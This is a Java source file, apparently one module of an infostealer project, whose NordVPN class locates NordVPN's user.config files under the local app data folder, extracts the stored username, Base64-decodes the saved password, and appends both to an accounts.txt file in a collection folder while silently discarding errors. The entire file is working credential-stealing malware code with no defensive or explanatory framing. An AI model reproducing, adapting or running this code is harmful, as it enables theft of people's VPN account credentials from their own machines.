package itzgonza.hollyshit.impl.vpn;

import java.io.File;
import java.nio.file.Paths;
import java.util.Base64;

import javax.xml.parsers.DocumentBuilderFactory;

import org.apache.commons.io.FileUtils;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;

import itzgonza.hollyshit.utils.utilities;

public class NordVPN extends utilities {

    public void initialize() {
        try {
            String appDataPath = System.getenv("LOCALAPPDATA");
            File nordVpnFolder = Paths.get(appDataPath, "NordVPN").toFile();

            if (!nordVpnFolder.exists() || !nordVpnFolder.isDirectory()) return;

            File[] nordVpnExeFiles = nordVpnFolder.listFiles((dir, name) -> name.startsWith("NordVpn.exe"));
            if (nordVpnExeFiles == null) return;

            for (File exeFile : nordVpnExeFiles) {
                File[] filesInExeDir = exeFile.getParentFile().listFiles();
                if (filesInExeDir == null) continue;

                for (File file : filesInExeDir) {
                    File userConfigFile = new File(file, "user.config");
                    if (!userConfigFile.exists()) continue;

                    Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(userConfigFile);
                    doc.getDocumentElement().normalize();

                    NodeList usernameList = doc.getElementsByTagName("Username");
                    String username = usernameList.getLength() > 0 ? ((Element) usernameList.item(0)).getAttribute("value") : null;

                    NodeList passwordList = doc.getElementsByTagName("Password");
                    String password = passwordList.getLength() > 0 ? decode(((Element) passwordList.item(0)).getAttribute("value")) : null;

                    if (username != null && !username.isEmpty() && password != null && !password.isEmpty()) {
                        File outputFile = new File(getFolder() + "/vpn/nord/accounts.txt");
                        outputFile.getParentFile().mkdirs();
                        FileUtils.writeStringToFile(outputFile, String.format("Username: %s\nPassword: %s\n\n", username, password), "utf-8", true);
                        content.add("nord_vpn");
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    private static String decode(String s) {
        try {
            // NordVPN uses simple base64 encoding
            return new String(Base64.getDecoder().decode(s), "utf-8");
        } catch (Exception ignored) {
            return "";
        }
    }
}